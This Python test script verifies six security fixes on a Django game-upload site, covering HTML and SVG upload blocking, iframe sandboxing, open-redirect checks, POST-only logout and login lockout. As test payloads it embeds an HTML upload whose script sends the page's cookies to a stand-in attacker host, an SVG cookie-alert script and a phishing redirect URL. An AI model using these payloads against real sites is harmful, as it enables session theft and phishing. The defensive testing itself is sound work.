"""
HiddenGems Security Fix Verification Tests
==========================================
Tests the 6 security fixes owned by the uploads/accounts dev.

Usage:
    # Against local dev server (default):
    python test_security_fixes.py

    # Against a different host:
    python test_security_fixes.py --base-url http://your-droplet-ip:8000

    # Create a test user first if needed:
    python test_security_fixes.py --username testuser --password testpass123

Requirements:
    pip install requests
"""

import argparse
import io
import sys
import requests

# ── CLI args ──────────────────────────────────────────────────────────────────
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="HiddenGems security fix tests")
    parser.add_argument("--base-url", default="http://localhost:8000",
                        help="Base URL of the running app (no trailing slash)")
    parser.add_argument("--username", default="testuser",
                        help="Existing test account username")
    parser.add_argument("--password", default="testpass123",
                        help="Existing test account password")
    args = parser.parse_args()
    BASE = args.base_url.rstrip("/")
    USERNAME = args.username
    PASSWORD = args.password
else:
    BASE = "http://localhost:8000"
    USERNAME = "testuser"
    PASSWORD = "testpass123"

# ── Helpers ───────────────────────────────────────────────────────────────────
PASS = "\033[92m[PASS]\033[0m"
FAIL = "\033[91m[FAIL]\033[0m"
INFO = "\033[94m[INFO]\033[0m"

results = []


def result(name, passed, detail=""):
    icon = PASS if passed else FAIL
    print(f"  {icon} {name}")
    if detail:
        print(f"         {detail}")
    results.append((name, passed))


def get_csrf(session, url):
    session.get(url)
    return session.cookies.get("csrftoken", "")


def login(session):
    """Log in and return True on success."""
    url = f"{BASE}/accounts/login/"
    csrf = get_csrf(session, url)
    resp = session.post(url, data={
        "username": USERNAME,
        "password": PASSWORD,
        "csrfmiddlewaretoken": csrf,
    }, headers={"Referer": url}, allow_redirects=False)
    return resp.status_code == 302


def upload_file(session, filename, content, content_type, extra_fields=None):
    """POST to /upload/ and return the response."""
    url = f"{BASE}/upload/"
    csrf = get_csrf(session, url)
    fields = {
        "title": f"Test Game {filename}",
        "description": "Security test upload",
        "price": "0.00",
        "genre": "Action",
        "csrfmiddlewaretoken": csrf,
    }
    if extra_fields:
        fields.update(extra_fields)
    files = {"build_file": (filename, io.BytesIO(content), content_type)}
    return session.post(url, data=fields, files=files,
                        headers={"Referer": url}, allow_redirects=True)


# ── Tests ─────────────────────────────────────────────────────────────────────

print(f"\n{'='*60}")
print(f"  HiddenGems Security Fix Tests")
print(f"  Target: {BASE}")
print(f"{'='*60}\n")

# ── Test 1: Block HTML build file upload ─────────────────────────────────────
print("TEST 1 — HTML build file upload should be blocked")
s = requests.Session()
if not login(s):
    print(f"  {INFO} Could not log in as {USERNAME} — skipping upload tests")
    print(f"         Create the user first: python manage.py createsuperuser")
    results.append(("HTML upload blocked", None))
    results.append(("SVG thumbnail upload blocked", None))
    results.append(("iframe sandbox attribute present", None))
else:
    malicious_html = b"""<!DOCTYPE html><html><body>
    <script>
      var stolen = window.parent.document.cookie;
      new Image().src = 'https://attacker.example.com/steal?c=' + encodeURIComponent(stolen);
    </script>
    </body></html>"""

    resp = upload_file(s, "evil.html", malicious_html, "text/html",
                       extra_fields={"playable_in_browser": "on"})

    # A blocked upload stays on /upload/ (200) or returns a validation error.
    # A successful upload redirects to the game detail page.
    blocked = "evil.html" not in resp.url and (
        resp.status_code == 200 or "valid" in resp.text.lower()
        or "not allowed" in resp.text.lower() or "invalid" in resp.text.lower()
    )
    result(
        "HTML build file upload blocked",
        blocked,
        f"Response URL: {resp.url}  Status: {resp.status_code}"
    )

    # ── Test 2: Block SVG thumbnail upload ───────────────────────────────────
    print("\nTEST 2 — SVG thumbnail upload should be blocked")
    s2 = requests.Session()
    login(s2)
    url = f"{BASE}/upload/"
    csrf = get_csrf(s2, url)
    malicious_svg = b"""<?xml version="1.0"?>
    <svg xmlns="http://www.w3.org/2000/svg">
      <script>alert(document.cookie)</script>
    </svg>"""
    files = {"thumbnail": ("evil.svg", io.BytesIO(malicious_svg), "image/svg+xml")}
    data = {
        "title": "SVG Test Game",
        "description": "Security test",
        "price": "0.00",
        "csrfmiddlewaretoken": csrf,
    }
    resp2 = s2.post(url, data=data, files=files,
                    headers={"Referer": url}, allow_redirects=True)
    svg_blocked = resp2.status_code == 200 and (
        "not allowed" in resp2.text.lower()
        or "invalid" in resp2.text.lower()
        or "valid" in resp2.text.lower()
        or resp2.url.endswith("/upload/")
    )
    result(
        "SVG thumbnail upload blocked",
        svg_blocked,
        f"Response URL: {resp2.url}  Status: {resp2.status_code}"
    )

    # ── Test 3: iframe sandbox attribute ─────────────────────────────────────
    print("\nTEST 3 — Game detail iframe should have sandbox attribute")
    # Upload a legitimate zip and check the resulting game page
    s3 = requests.Session()
    login(s3)
    zip_content = b"PK\x03\x04" + b"\x00" * 26  # minimal zip header
    resp3 = upload_file(s3, "game.zip", zip_content, "application/zip",
                        extra_fields={"playable_in_browser": "on"})

    # Try to find the game detail page from the redirect
    if resp3.url and "/game/" in resp3.url:
        page = s3.get(resp3.url)
        has_sandbox = 'sandbox=' in page.text or 'sandbox"' in page.text
        result(
            "iframe sandbox attribute present",
            has_sandbox,
            f"Checked: {resp3.url}"
        )
    else:
        # Check browse page for any game with playable_in_browser
        browse = s3.get(f"{BASE}/browse/")
        # Find a game slug and check it
        import re
        slugs = re.findall(r'/game/([\w-]+)/', browse.text)
        found_sandbox = False
        checked_url = None
        for slug in slugs[:3]:
            page = s3.get(f"{BASE}/game/{slug}/")
            if "game-iframe" in page.text or "iframe" in page.text:
                found_sandbox = 'sandbox=' in page.text
                checked_url = f"{BASE}/game/{slug}/"
                break
        result(
            "iframe sandbox attribute present",
            found_sandbox,
            f"Checked: {checked_url or 'no playable game found to check'}"
        )

# ── Test 4: Open redirect blocked ────────────────────────────────────────────
print("\nTEST 4 — Login ?next= open redirect should be blocked")
s4 = requests.Session()
evil_url = "https://attacker.example.com/phish"
login_url = f"{BASE}/accounts/login/?next={evil_url}"
csrf = get_csrf(s4, login_url)
resp4 = s4.post(login_url, data={
    "username": USERNAME,
    "password": PASSWORD,
    "csrfmiddlewaretoken": csrf,
}, headers={"Referer": login_url}, allow_redirects=False)

location = resp4.headers.get("Location", "")
redirect_blocked = "attacker.example.com" not in location
result(
    "Open redirect blocked",
    redirect_blocked,
    f"Redirect location: '{location}'"
)

# ── Test 5: Logout requires POST (GET should not log out) ─────────────────────
print("\nTEST 5 — GET /accounts/logout/ should NOT log user out")
s5 = requests.Session()
login(s5)

# Confirm we're logged in (upload page should be accessible)
check_before = s5.get(f"{BASE}/upload/", allow_redirects=False)
logged_in_before = check_before.status_code == 200

# Attempt GET logout (cross-site attack simulation)
s5.get(f"{BASE}/accounts/logout/", allow_redirects=False)

# Check if still logged in
check_after = s5.get(f"{BASE}/upload/", allow_redirects=False)
still_logged_in = check_after.status_code == 200

result(
    "GET logout does not log user out (CSRF fix)",
    still_logged_in,
    f"Before GET logout — upload accessible: {logged_in_before}  |  After: {check_after.status_code}"
)

# Bonus: confirm POST logout DOES work
s5b = requests.Session()
login(s5b)
csrf_logout = get_csrf(s5b, f"{BASE}/")
logout_resp = s5b.post(f"{BASE}/accounts/logout/", data={
    "csrfmiddlewaretoken": csrf_logout
}, headers={"Referer": f"{BASE}/"}, allow_redirects=False)
check_after_post = s5b.get(f"{BASE}/upload/", allow_redirects=False)
post_logout_works = check_after_post.status_code in (302, 301)
result(
    "POST logout works correctly",
    post_logout_works,
    f"Upload after POST logout: {check_after_post.status_code} (expect 302 redirect)"
)

# ── Test 6: Rate limiting (django-axes) ───────────────────────────────────────
print("\nTEST 6 — 5 failed logins should trigger account lockout")
s6 = requests.Session()
login_url = f"{BASE}/accounts/login/"
locked = False

for i in range(6):
    csrf = get_csrf(s6, login_url)
    resp = s6.post(login_url, data={
        "username": USERNAME,
        "password": "WRONG_PASSWORD_intentional",
        "csrfmiddlewaretoken": csrf,
    }, headers={"Referer": login_url}, allow_redirects=True)

    # axes returns 403 on lockout, or redirects to a lockout page
    if resp.status_code == 403 or "locked" in resp.text.lower() \
            or "too many" in resp.text.lower() or "account locked" in resp.text.lower():
        locked = True
        print(f"  {INFO} Locked out after {i+1} attempt(s)")
        break

result(
    "Rate limiting locks out after failed attempts",
    locked,
    "Expected lockout within 6 attempts (axes AXES_FAILURE_LIMIT=5)"
)

# ── Summary ───────────────────────────────────────────────────────────────────
print(f"\n{'='*60}")
print("  SUMMARY")
print(f"{'='*60}")
passed = sum(1 for _, p in results if p is True)
failed = sum(1 for _, p in results if p is False)
skipped = sum(1 for _, p in results if p is None)

for name, p in results:
    if p is True:
        print(f"  {PASS} {name}")
    elif p is False:
        print(f"  {FAIL} {name}")
    else:
        print(f"  \033[93m[SKIP]\033[0m {name}")

print(f"\n  Passed: {passed}  Failed: {failed}  Skipped: {skipped}")
print(f"{'='*60}\n")

if failed > 0:
    sys.exit(1)